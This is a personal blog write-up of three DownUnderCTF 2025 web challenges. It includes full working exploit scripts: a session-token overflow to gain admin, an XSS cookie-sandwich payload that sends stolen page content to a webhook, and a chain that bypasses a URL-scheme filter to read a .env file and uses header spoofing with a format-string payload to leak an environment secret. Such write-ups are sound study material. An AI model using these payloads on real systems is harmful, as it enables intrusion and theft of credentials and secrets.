---
title: 'some down under ctf 2025 web writeups'
description: 'some down under ctf 2025 web writeups'
date: 2025-07-20
tags: ['web', 'ctf', 'writeup']
image: './ductf.png'
authors: ['jp']
---

# Background Information

Hi, we are back to CTF'ing and although I usually play with Cosmic Bit Flip, I decided to play with Squid Proxy Lovers for this ctf. Hopefully I didnt do too bad lmao. Didn't really solve sodium, but I sank too much time on it to not write abt it sorry so I'll just mark it as upsolved (basically followed Corgo's solution).

## gomail

> Dear jp,
>
> We received intel that before the email apocalypse the DUCTF admin team emailed MC Fat Monke with a new flag, since the monke kept on leaking flags...
>
> Regards,
> MC Fat Monke

When reading `handlers.go`, we see that theres an admin email that contains the flag that is held by user "mc-fat@monke.zip". There's also login logic:

```go
func LoginHandler(c *gin.Context) {
	var lr loginReq
	var err error
	// reads the json we provide
	if err = c.BindJSON(&lr); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "error reading json",
		})
		return
	}
	// initially sets admin to false, user Pass to userlogins[lr.email]???
	isAdmin := false
	usrPass := userLogins[lr.Email]
	if usrPass != nil {
		// this thing sets isAdmin to true...iff the password =  lr.Password.
		if subtle.ConstantTimeCompare([]byte(lr.Password), usrPass) == 1 {
			isAdmin = true
		} else {
			lr.Email = guestEmail
		}
	}
	sH, exists := c.Get("sessionHandler")
	if !exists {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "could not get session handler",
		})
		return
	}
	//encodes the email and isadmin into a session token
	token, err := sH.(session.Session).Encode(lr.Email, isAdmin)

	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": err,
		})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"token": token,
	})
```

Essentially checks if entered password and admin password are the same, if so give us admin and the right email. If not, it will give us the guest account and email that is essentially useless. 

We have auth logic in `session.go`, which is:

```go
package session

import (
	"bytes"
	"compress/gzip"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"io"
	"strings"
	"time"
)

type InvalidTokenError struct{}

func (m *InvalidTokenError) Error() string {
	return "invalid token"
}

type ExpiredTokenError struct{}

func (m *ExpiredTokenError) Error() string {
	return "expired token"
}

type Session struct {
	Key []byte
}

func (se Session) sign(d []byte) []byte {
	mac := hmac.New(sha256.New, se.Key)
	mac.Write(d)
	return mac.Sum(nil)
}

func (se Session) Encode(email string, isAdmin bool) (token string, err error) {
	sc := SessionClaims{
		Email:   email,
		Expiry:  time.Now().Unix() + 86400,
		IsAdmin: isAdmin,
	}
	sr := NewSessionSerializer()
	bts, err := sr.Serialize(&sc)

	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, err = w.Write(bts)
	w.Close()
	if err != nil {
		return "", err
	}

	bts = buf.Bytes()
	sig := se.sign([]byte(bts))

	token = base64.URLEncoding.EncodeToString(bts) + "." + base64.URLEncoding.EncodeToString(sig)

	return token, nil
}

func (se Session) Decode(token string, dstSC *SessionClaims) (err error) {
	ps := strings.SplitN(token, ".", 2)
	if len(ps) != 2 {
		return &InvalidTokenError{}
	}
	bts, err := base64.URLEncoding.DecodeString(ps[0])
	if err != nil {
		return err
	}
	sig, err := base64.URLEncoding.DecodeString(ps[1])
	if err != nil {
		return err
	}
	// this is how it verfiies the expSig?
	expSig := se.sign(bts)
	if !hmac.Equal(sig, expSig) {
		return &InvalidTokenError{}
	}
	buf := bytes.NewReader(bts)
	r, err := gzip.NewReader(buf)
	if err != nil {
		return err
	}
	bts, err = io.ReadAll(r)
	r.Close()
	if err != nil {
		return err
	}
	sr := NewSessionSerializer()
	err = sr.Deserialize(bts, dstSC)
	if err != nil {
		return err
	}
	if time.Now().Unix() > dstSC.Expiry {
		return &ExpiredTokenError{}
	}
	return nil
}
```

The problem with this is that it probably uses a raw buffer, therefore the solution to get admin is to overwrite the password field as well as the isAdmin field. Unfortunately, spamming '1' to make the field true won't work, but Go has an interesting behavior where the byte character 't' will also evaluate to true in a struct.

So we just spam t's in the buffer.

```python
import requests
import base64
import gzip
import struct
import hmac
import hashlib

url = "https://web-gomail-3f344244ceb2.2025-us.ductf.net/"
login = "/login"
emails = "/emails"

# login with token
print("[*] Logging in as guest...")
resp = requests.post(url + login, json={
    "email": "mc-fat@monke.zip" + "t" * 65536, # overflow to the other fields lmoa!
    "password": "wrongpassword",
})
print(resp.text)
token = resp.json()["token"]
print(f"[+] Got token: {token}")


data_b64, sig_b64 = token.split(".")
compressed_data = base64.urlsafe_b64decode(data_b64 + "==") 
decompressed = gzip.decompress(compressed_data)
token = data_b64 + '.' + sig_b64
print(f"[*] Original decompressed data length: {len(decompressed)}")
print(f"[*] Data hex: {decompressed}")

print(f"[*] Original session data structure:")
email_len_bytes = decompressed[0:2]
email_len = struct.unpack("<H", email_len_bytes)[0]
print(f"    Email length: {email_len}")
email_data = decompressed[2:2+email_len]
print(f"    Email: {email_data.decode()}")
expiry_data = decompressed[2+email_len:2+email_len+8]
print(f"    Expiry: {struct.unpack('<Q', expiry_data)[0]}")
is_admin = decompressed[2+email_len+8:2+email_len+9]
print(f"    IsAdmin: {is_admin} ({'true' if is_admin == b't' else 'false'})")

# access emails
print("\n[*] Attempting to access emails with guest token...")
headers = {"X-Auth-Token": token}
resp = requests.get(url + emails, headers=headers)
print(f"[+] Response: {resp}")

print(f"[+] Response: {resp.json()}")
```

```bash
[+] Response: {'emails': [{'from': 'admin@duc.tf', 'to': 'mc-fat@monke.zip', 'subject': 'Your New Challenge Flag', 'data': 'Hey MC Fat Monke,\n\nWe heard once again you accidentally leaked your flag for your last challenge...\n\nBruh stop doing that...\n\nHere is your new flag for your challenge, please stop leaking it...\n\nFlag: DUCTF{g0v3rFloW_2_mY_eM41L5!}\n\nFrom DUCTF Admin\n'}]}
```


## sweet treat

> Dear jp,
>
> Hope you have a sweet tooth.
>
> Regards,
> sidd.sh

We have basic login / register Apache Tomcat JSP web application with an admin visiting bot that sets an httpOnly cookie with the flag

```java
if (isAdminCookie) {
        session.setAttribute("user", "admin");
        System.out.println("Set the Admin session");
        Cookie delCookie = new Cookie("admin", "");
        delCookie.setMaxAge(0);
        delCookie.setPath("/");
        response.addCookie(delCookie);
        Cookie flag = new Cookie("flag", "DUCTF{FAKE_FLAG}");
        flag.setPath("/");
        flag.setHttpOnly(true);
        response.addCookie(flag);

}  
```

Obviously this sucks since we cant just use basic XSS to steal the flag, so we need to find another way to do this. 

There's a very basic XSS in `edit_profile.jsp`, along with the admin bot functionality

```
 // Handle form submission for updating about me
    if ("POST".equalsIgnoreCase(request.getMethod()) && request.getParameter("aboutMe") != null) {
        String newAboutMe = request.getParameter("aboutMe");
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection(dbURL);

            String updateSql = "UPDATE users SET aboutme = ? WHERE username = ?";
            pstmt = conn.prepareStatement(updateSql);
            pstmt.setString(1, newAboutMe);
            pstmt.setString(2, username);
            pstmt.executeUpdate();
            pstmt.close();
        } catch(Exception e) {
            out.println("Database error: " + e.getMessage());
        } finally {
            try { if (pstmt != null) pstmt.close(); } catch(Exception e) {}
            try { if (conn != null) conn.close(); } catch(Exception e) {}
        }
    }
        try {
            java.net.URL url = new java.net.URL("http://xssbot/visit");
            java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setRequestProperty("X-SSRF-Protection", "1");
            con.setDoOutput(true);
            String json = "{\"url\": \"http://sweet-treat:8080/admin/admin-review.jsp\"}"; // 127.0.0.1 when deployed
            try (java.io.OutputStream os = con.getOutputStream()) {
                byte[] input = json.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            int code = con.getResponseCode();
            // Optionally, you can read the response here if needed
            if (code != 202) {
                out.println("Error notifying bot: " + code);
            } else {
                out.println("Bot notified successfully.");
            }
            con.disconnect();
        } catch(Exception e) {
            out.println("Bot notify error: " + e.getMessage());
        }
    }

    // Fetch current aboutme section for this user
    try {
        Class.forName("org.sqlite.JDBC");
        conn = DriverManager.getConnection(dbURL);
        String selectSql = "SELECT aboutme FROM users WHERE username = ?";
        pstmt = conn.prepareStatement(selectSql);
        pstmt.setString(1, username);
        rs = pstmt.executeQuery();
        if (rs.next()) {
            aboutMe = rs.getString("aboutme");
            if (aboutMe == null) aboutMe = "";
        }
    } catch(Exception e) {
        out.println("Database error: " + e.getMessage());
    } finally {
        try { if (rs != null) rs.close(); } catch(Exception e) {}
        try { if (pstmt != null) pstmt.close(); } catch(Exception e) {}
        try { if (conn != null) conn.close(); } catch(Exception e) {}
    }
    String loggedInUser = (String) session.getAttribute("user");
%>
<%! 
    public String escapeHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#x27;");
    }
%>
<!DOCTYPE html>
<html>
<head>
    <title>Edit Profile</title>
    <style>
        .navbar {
            width: 100%;
            background: #2563eb;
            color: #fff;
            padding: 0.7rem 0;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 1.5rem;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 200;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }
        .navbar a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
            font-size: 1rem;
            margin-right: 2rem;
            transition: color 0.2s;
        }
        .navbar a:hover {
            color: #c7d2fe;
        }
        .user-bar {
            position: absolute;
            top: 70px;
            right: 32px;
            background: #f4f6fb;
            color: #2d3a4b;
            padding: 0.5rem 1.2rem;
            border-radius: 20px;
            font-weight: 500;
            font-size: 1rem;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            z-index: 100;
        }
        .profile-container {
            background: #fff;
            padding: 2.5rem 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            width: 400px;
            margin: 110px auto 0 auto;
            text-align: center;
        }
        textarea {
            width: 100%;
            padding: 0.7rem;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 1rem;
            background: #f9fafb;
            margin-bottom: 1.2rem;
            resize: vertical;
        }
        button {
            padding: 0.8rem 2rem;
            background: #4f8cff;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #2563eb;
        }
        .report-btn {
            margin-top: 1.2rem;
            background: #ff4f4f;
            color: #fff;
        }
        .report-btn:hover {
            background: #c53030;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a href="/index.jsp">Home</a>
        <a href="/edit_profile.jsp">Edit Profile</a>
        <% if ("admin".equals(loggedInUser)) { %>
            <a href="/admin/admin-review.jsp">Review Reports</a>
            <a href="/admin/admin.jsp">Admin Dashboard</a>
        <% } %>
        <a href="/logout.jsp">Logout</a>
    </div>
    <div class="user-bar">
        <span>👤 <%= escapeHtml(username) %></span>
    </div>
    <div class="profile-container">
        <h2>Edit Your About Me</h2>
        <form method="POST">
            <textarea name="aboutMe" rows="8" placeholder="Write something about yourself..."><%= aboutMe != null ? escapeHtml(aboutMe) : "" %></textarea>
            <br>
            <button type="submit">Save</button>
        </form>
        <form method="POST" style="margin-top: 0;">
            <input type="hidden" name="reportProfile" value="1" />
            <button type="submit" class="report-btn">Report Profile to Admin</button>
        </form>
    </div>
    <footer>
      <p style="text-align: center; font-size: 0.9rem; color: #6b7280;">&copy; 2025 Sweet Treats INC</p>
      <p style="text-align: center; font-size: 0.8rem; color: #9ca3af;">For internal use only</p>
    </footer>
</body>
</html>
```

It might not be super obvious for the XSS, but a little manual testing will reveal that it's possible. So how can we steal the cookie if it's httponly and we only have XSS?

Well, due to the web server being an older version of Apache Tomcat, Corgo gave a pretty nice vuln called "Cookie Sandwiching", which is outlined here: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique.

I won't go in depth, but basically if a cookie value is revealed on the frontend, we can basically "sandwich" the httponly cookie between two regular cookies due to how Apache Tomcat parses cookies with quotes and all that.

Here's the exploit:

```html
<script>
document.cookie = `$Version=1; Path=/index.jsp`
document.cookie = `language="; Path=/index.jsp`
document.cookie = `dummy="; Path=/`
fetch("/index.jsp")
    .then(response => response.text())
    .then((data) => {
        fetch("YOUR_WEBHOOK_HERE", {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({data: (data)})
        })
    })
</script>
```

Just send it and get the flag in your webhook.

```DUCTF{1_th0ught_y0u_c0uldnt_st34l_th3m}```

## sodium (upsolved)

> Dear jp,
>
> This one might require a pinch of patience.
>
> Regards,
> sidd.sh

**Disclaimer: I want to assert that Corgo solved this so I dont want to be stealing solution and claiming I was the one who solved it. I basically only found a few parts of the exploit and got stuck...**

So they give us a web server obscured with a basic "non-interactive" frontend and the actual "customer" interface is what we want. 

```python
BLACKLIST = ['file', 'gopher', 'dict']
AUTHENTICATION_KEY = os.environ.get('AUTHENTICATION_KEY')

def is_safe_url(url):
    scheme = urlparse(url).scheme
    if scheme in BLACKLIST:
        logger.warning(f"[!] Blocked by blacklist: scheme = {scheme}")
        flash("BAD URL: The URL scheme is not allowed.", "danger")
        return False
    return True

@main.route('/', methods=['GET', 'POST'])
def index():
    if 'user_id' not in session:
        logger.info(session)
        return redirect(url_for('auth.login'))

    if request.method == 'POST':
        url = request.form.get('url', '')
        if not url:
            logger.debug("[!] No URL provided.")
            return render_template("index.html", error="Please enter a URL.")

        if not is_safe_url(url):
            logger.warning(f"[!] Unsafe URL detected: {url}")
            return render_template("result.html", domain=url, result="Blocked by blacklist.")
        # TODO: Extract information from the domain, and check if they are with us.
        try:
            preview = urlopen(url).read().decode('utf-8', errors='ignore')
            # For now, just get the company name
            try:
                company_name = re.search(r'<title>(.*)</title>', preview).group(1) 
            except:
                company_name = "Company name not found"
            result = f"Website Responds with: <br><pre>{preview}</pre>"
            logger.debug(f"[+] Successfully fetched content from {preview}")
            company = Company(domain=url, name=company_name, description="No description provided.")
            db.session.add(company)
            db.session.commit()
        except Exception as e:
            result = f"Error: <code>{str(e)}</code>"

        scan = ScanResult(domain=url, result=result, user_id=session['user_id'])
        db.session.add(scan)
        db.session.commit()
        return render_template("result.html", domain=url, result=result, scan=scan)

    return render_template("index.html")
```

This is the main relevant snippet, which basically allows us to report a url but note that we "cannot" report file and go and other things. However, this is an important component to the exploit that I missed (pretty wild lmao): **adding a space in front of the url will bypass this filter**.

We can use this to pretty much leak stuff. Now let's look at the custom RPC server. 

```python
# Logging configuration based on environment
FLAG = os.getenv("FLAG")
ENV = os.getenv("ENV", "production").lower()
LOG_LEVEL = logging.DEBUG
LOG_FORMAT = '[%(asctime)s] %(levelname)s: %(message)s' if ENV == "debug" else '[%(asctime)s] %(message)s'
logging.basicConfig(level=LOG_LEVEL, format=LOG_FORMAT, handlers=[ logging.FileHandler("debug.log"), logging.StreamHandler()])
logger = logging.getLogger("rpc_service")

class Config:
    def __init__(self):
        self.auth_key = os.getenv('AUTHENTICATION_KEY')
        self.service = 'RPC'
        self.requests = 0
        self.authorized_ips = ["127.0.0.1"]
    
    def __repr__(self):
        joined_ips = '</br>\n'.join(self.authorized_ips)
        repr_message = f"\nCurrent Server Time: {datetime.datetime.now().strftime('%Y %M %d %T')}"
        repr_message += f"\n</br>Authorized IPs:</br>{joined_ips}"
        repr_message += f"\n</br>Authentication Token: {self.auth_key[0:8]}..."
        repr_message += f"\n</br>Requests served: {self.requests}"
        return repr_message

config = Config()
# here the stats page looks
def build_stats_page(get_log=False, get_config=True):
    """Provide analytics for the RPC Service, display configurations and display activity logs"""

    # Print logs
    if get_log == True:
        template = """
            <h1>Admin Stats Page</h1>
                {logs}
            """.format(logs=get_logs())
    else:
        template = """
            <h1>Admin Stats Page</h1>
            <p>Page to show logs or Configuration</p>
            """

    # Full config
    if get_config == True:
        template += """
                    <h2>Current Configuration</h2>
                    {config}
                    """
    else:
        template += """<p>{config.service} service health ok</p>"""

    template += "<p>Administrative Interface for RPC Server</p>"
    logger.error(template)
    return template.format(config=config) # looks hella sus
```

This basically is the admin panel, and there's a pretty nasty python format string vulnerability, which if you are not so familiar with can read more about here: https://ctf.gg/blog/buckeyectf-2024-gentleman. 

There's also request handling which reveals the /stat route, one that we need to access in order to have the python format string vulnerability.

```python
def handle_request(conn, conn_state, request):
    """Handle incoming requests and route them to the appropriate handler based on the request target."""
    target = request.target.decode()
    headers = {k.decode().lower(): v.decode() for k, v in request.headers}
    
    # Allowlist check
    forwarded_for = headers.get("x-forwarded-for", "").strip()
    auth_key = headers.get("auth-key")
    
    if config.authorized_ips and forwarded_for not in config.authorized_ips:
        logger.warning(f"Blocked access from unauthorized IP: {forwarded_for}")
        body = f"Access denied: You are not allowed:to access this service. Only {', '.join(config.authorized_ips)} are allowed access.".encode()
        body += f". \nThe IP recieved was: {forwarded_for}".encode()

        send_response(conn, conn_state, 403, body)
        return

    # Simple auth check for endpoints that require authentication
    elif auth_key != config.auth_key:
        logger.warning("Unauthorized access attempt to /stats")
        send_response(conn, conn_state, 403, "Unauthorized: Invalid Auth-Key")
        return

    # /stats endpoint
    if target.startswith("/stats"):
        try:
            params = {}
            for param in re.search(r".*\?(.*)", target).groups()[0].split("&"):
                logger.error(param)
                params[param.split("=")[0]] = bool(param.split("=")[1])
            body = build_stats_page(**params).encode()
        except Exception as e:
            logger.error(f"[!] Error while fetching stats. Request made to: {target} with error: {e}")
            send_response(conn, conn_state, 500, e)
            return
        send_response(conn, conn_state, 200, body)
        return

    # /ping endpoint
    elif target == "/ping":
        send_response(conn, conn_state, 200, "Pong!")
        return

    # /update_allowlist endpoint, instead of hardcoding IP's manually, just make it easier to update the config on the fly.
    # DB driven in the future
    elif target.startswith("/update_allowlist"):
        ip_address = target.split('=')[-1]
        if ip_address:
            if ip_address not in config.authorized_ips and re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$").findall(ip_address):
                config.authorized_ips.append(ip_address)
                logger.info(f"Added {ip_address} to allowlist.")
                send_response(conn, conn_state, 200, f"IP {ip_address} added to allowlist.")
            else:
                logger.warning(f"IP {ip_address} is already in the allowlist or Invalid Input Provided.")
                send_response(conn, conn_state, 200, f"IP {ip_address} is already allowed.")
        return

    # TODO: Add more endpoints for internal service management. Final version will act like a control 
    # panel for all the internal services custom built for our needs, possibly could be done using an internal scan
    else:
        send_response(conn, conn_state, 404, "Invalid endpoint or missing key")
        return
def serve():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", 8081))
    sock.listen(5)
    logger.info("[*] RPC backend listening on port 8081")

    while True:
        conn, _ = sock.accept()
        conn.settimeout(10)
        conn_state = h11.Connection(h11.SERVER)
        buffer = b""
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break

                conn_state.receive_data(data)

                while True:
                    try:
                        event = conn_state.next_event()
                    except Exception as e:
                        logger.error(f"[!] State transition error: {e}")
                        raise

                    if isinstance(event, h11.Request):
                        handle_request(conn, conn_state, event)

                    elif isinstance(event, h11.EndOfMessage):
                        try:
                            conn_state.start_next_cycle()
                            logger.debug("[*] Started next cycle")
                        except Exception as e:
                            logger.error(f"[!] Could not reset connection: {e}")
                            raise

                    elif isinstance(event, h11.NEED_DATA):
                        break

                    elif isinstance(event, h11.PAUSED):
                        logger.debug("[*] Connection is paused.")
                        break
                    else:
                        logger.warning(f"[!] Unexpected event: {event}")

        except h11.RemoteProtocolError as e:
            logger.error(f"[!] RemoteProtocolError: {e}")
        except Exception as e:
            logger.error(f"[!] General error: {e}")
        finally:
            try:
                conn.close()
                logger.debug("[*] Connection closed")
            except Exception as e:
                logger.error(f"[!] Error closing connection: {e}")

```

So the way to solve this is to first, use ` file://` to leak the env AUTHENTICATION_KEY, then connect directly via sockets to the RPC url with a forged GET request with two `X-Fowarded-For: 127.0.0.1`, as the backend will read the second one despite our ip (invalid) being appended to the first. We then can use the format string vulnerability to leak the flag then check logs for the flag content 

**note: I repurposed this from the official solve at https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/sodium/solve/solve.py but adjusted the solve to Corgo's steps since that is the solvepath they found**

```python
import requests
import socket
import time
import re
from urllib.request import urlopen, Request
import ssl

TARGET = "https://sodium-47a19d41984fb60e.iso.2025-us.ductf.net"  # Public Flask service
TARGET_POUND = TARGET.split("//")[1]              # Proxy in front of h11 backend
POUND_PORT = 443                         # Pound proxy port
ATTACKER_IPS = []  # Attacker's IP address, change as needed

def leak_internal_authentication_key(session):
    print("[*] Leaking internal API key via /proc/self/environ...")
    payload = {
        "url": " file:///proc/self/cwd/.env"
    }
    res = session.post(TARGET + "/", data=payload, headers={"Host": "dev.customer.ductf"})
    if res.status_code != 200:
        print(f"[!] Unexpected status code: {res.status_code}")
        return None

    match = re.search(r'AUTHENTICATION_KEY=([A-Za-z0-9_]+)', res.text)
    if match:
        key = match.group(1)
        print(f"[+] Leaked internal API key: {key}")
        return session, key
    else:
        print("[!] Key not found in response")
        return None, None


def build_smuggled_request(authentication_key):
    stats = "/stats?{config.__init__.__globals__[os].environ[FLAG]}"
    payload = (
        f"GET {stats} HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        f"Auth-Key: {authentication_key}\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "Connection: Close\r\n"
        "\r\n"
    )

    

    return payload.encode()


def send_smuggled_request(internal_authentication_key):
    print("[*] Sending smuggled request...")

    sock = socket.create_connection((TARGET_POUND, POUND_PORT))
    context = ssl.create_default_context()
    secure_sock = context.wrap_socket(sock, server_hostname=TARGET_POUND)

    payload = build_smuggled_request(internal_authentication_key)
    print(f"[*] Payload length: {len(payload)} bytes")
    secure_sock.sendall(payload)
    time.sleep(1)
    print("[*] Awaiting response...")

    response = b""
    try:
        while True:
            chunk = secure_sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except Exception:
        pass
    print(response)
    secure_sock.close()
    if not response:
        print(f"[+] No response received from the server. Payload likely successfully smuggled for whitelisting: {ip}")


def login(session):
    print("[*] Logging in...")
    res = session.post(TARGET + "/login", data={
        "username": "newuser",
        "password": "newpassword"
        }, allow_redirects=False, headers= {"Host": "dev.customer.ductf"})

    if res.status_code == 302:
        print("[+] Login successful")
    else:
        print("[!] Login failed")

    return session


def register(session):
    print("[*] Registering new user...")
    res = session.post(TARGET + "/register", data={
        "username": "newuser",
        "password": "newpassword"
    }, allow_redirects=False, headers = {"Host" : "dev.customer.ductf"})

    if res.status_code == 302:
        print("[+] Registration successful")
    else:
        print("[!] Registration failed")

    return session

def get_flag(authentication_key=None):
    print("[*] Fetching flag...")
    send_smuggled_request(authentication_key)
   
    res = requests.get(TARGET + "/stats?get_log=true", headers = {"Auth-key": authentication_key, "Host": "dev.rpc-service.ductf"})
    flag = re.search(r'DUCTF\{.*?\}', res.text).group(0)
    if flag:
        print(f"[+] Flag: {flag}")
    else:
        print(f"[-] Flag not found: {res.text}")

def main():
    session = requests.Session()
    session = register(session)
    session = login(session)

    session, authentication_key = leak_internal_authentication_key(session)
    if not authentication_key:
        print("[!] Could not retrieve key, aborting.")
        return

    get_flag(authentication_key)

if __name__ == "__main__":
    main()
```

And we get the flag: `[+] Flag: DUCTF{th3y_s33_m3_smuggl1ng_4nd_ch41n1ng}`.

# Conclusion

Overall pretty cool ctf. The web challenges were kinda frustrating, and I wish I would just make sure to read better and make sure to thoroughly test every component before attempting to make an exploit because that was mostly the reason as to why it took so long for me to solve / comprehend the challenges, and I end up hyperfocusing on only a part of the greater exploit picture. Hopefully in future CTFs I can learn to break out of this annoying habit. Anyways, I'll be back to grinding pwn.college (need that blue belt :sob: but impossible) in the meanwhile, and getting ready for college.